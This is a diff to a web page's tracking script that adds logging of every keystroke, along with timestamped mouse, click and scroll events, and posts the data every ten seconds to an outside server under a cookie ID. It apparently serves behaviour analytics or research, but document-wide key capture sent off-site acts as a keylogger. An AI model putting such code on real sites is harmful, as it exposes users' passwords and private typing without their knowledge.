@@ -56,26 +56,67 @@ console.log(img_enable);
 document.onmousemove = handleMouseMove;
 document.onmousedown = handleMouseClick;
 document.onscroll = handleMouseScroll;
+document.onkeydown = handleKeyDown;
+document.onkeyup = handleKeyUp;
 var mousePos = [];
 var mouseClick = [];
 var mouseScroll = [];
+var keyDown = [];
+var keyUp = [];
+function handleKeyDown(event) {
+    keyDown.push({
+        key: event.key,
+        keyCode: event.keyCode,
+        altKey: event.altKey,
+        ctrlKey: event.ctrlKey,
+        shiftKey: event.shiftKey,
+        timestamp: event.timeStamp
+      })
+}
+
+function handleKeyUp(event) {
+    keyUp.push({
+        key: event.key,
+        keyCode: event.keyCode,
+        altKey: event.altKey,
+        ctrlKey: event.ctrlKey,
+        shiftKey: event.shiftKey,
+        timestamp: event.timeStamp
+      })
+}
 
 function handleMouseClick(event) {
     var event = event || window.event;
+
     alert(event.button);
     if (event.button == 0) {
-        mouseClick.push("Left");
+        var click = {
+            "timestamp": event.timeStamp,
+            "button": "Left"
+        };
+        mouseClick.push(click);
     } else if (event.button == 2) {
-        mouseClick.push("Right");
+        var click = {
+            "timestamp": event.timeStamp,
+            "button": "Right"
+        };
+        mouseClick.push(click);
     } else if (event.button == 1) {
-        mouseClick.push("Middle");
+        var click = {
+            "timestamp": event.timeStamp,
+            "button": "Middle"
+        };
+        mouseClick.push(click);
     } else {
-        mouseClick.push("Others");
+        var click = {
+            "timestamp": event.timeStamp,
+            "button": "Others"
+        };
+        mouseClick.push(click);
     }
 }
 
 function handleMouseScroll(event) {
-    var eventDoc, doc, body;
 
     event = event || window.event; // IE-ism
     var doc = document.documentElement;
@@ -84,7 +125,8 @@ var top = (window.pageYOffset || doc.scrollTop)  - (doc.clientTop || 0);
 
     var point = {
         "scrollTop": top,
-        "scrollLeft": left
+        "scrollLeft": left,
+        "timestamp": event.timeStamp
     };
     mouseScroll.push(point);
 }
@@ -112,7 +154,8 @@ function handleMouseMove(event) {
 
     var point = {
         "x": event.pageX,
-        "y": event.pageY
+        "y": event.pageY,
+        "timestamp": event.timeStamp
     };
     mousePos.push(point);
 } 
@@ -167,7 +210,15 @@ $(document).ready(function(){
 });
     
 setInterval(function() {$.post("https://felixwangsd.xyz/api/activity",
-{ "cookieID": cookieID, "mousePos": JSON.stringify(mousePos), "mouseScroll": JSON.stringify(mouseScroll), "mouseClick": JSON.stringify(mouseClick)})
+{ 
+    "cookieID": cookieID,
+    "mousePos": JSON.stringify(mousePos),
+    "mouseScroll": JSON.stringify(mouseScroll),
+    "mouseClick": JSON.stringify(mouseClick),
+    "keyDown": JSON.stringify(keyDown),
+    "keyUp": JSON.stringify(keyUp)
+
+})
 .done(function(session) {
     mousePos = [];
     mouseScroll = [];
@@ -178,6 +229,8 @@ setInterval(function() {$.post("https://felixwangsd.xyz/api/activity",
     mousePos = [];
     mouseScroll = [];
     mouseClick = [];
+    keyDown = [];
+    keyUp = [];
 })
 }, 10000)
 
